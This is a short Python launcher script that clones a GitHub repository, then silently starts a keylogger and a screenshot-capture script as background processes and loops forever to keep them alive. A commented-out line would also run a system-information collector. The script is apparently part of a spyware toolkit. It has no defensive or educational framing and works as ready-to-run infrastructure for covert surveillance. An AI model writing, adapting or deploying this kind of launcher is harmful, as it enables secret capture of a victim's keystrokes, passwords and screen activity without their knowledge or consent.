import subprocess
import importlib
import importlib.util
import sys
import time
import os
from github_helper import GithubHelper


# Clone the GitHub repository
subprocess.run(["git", "clone", "https://github.com/fighttothesky/pythontest.git"])  # Replace with the repository URL

def run_script_as_background(script_path):
    # Run the script as a background process
    process = subprocess.Popen([sys.executable, script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Print the process ID (PID) of the background script
    print(f"Background script started with PID: {process.pid}")

    # You can continue executing other code in the main program


if __name__ == '__main__':
    script_path = 'screenshot.py'
    run_script_as_background(script_path)
    script_path = 'keylogger.py'
    run_script_as_background(script_path)
    while True:
        continue

# subprocess.Popen([sys.executable, "pythontest\\systeminfo.py"])
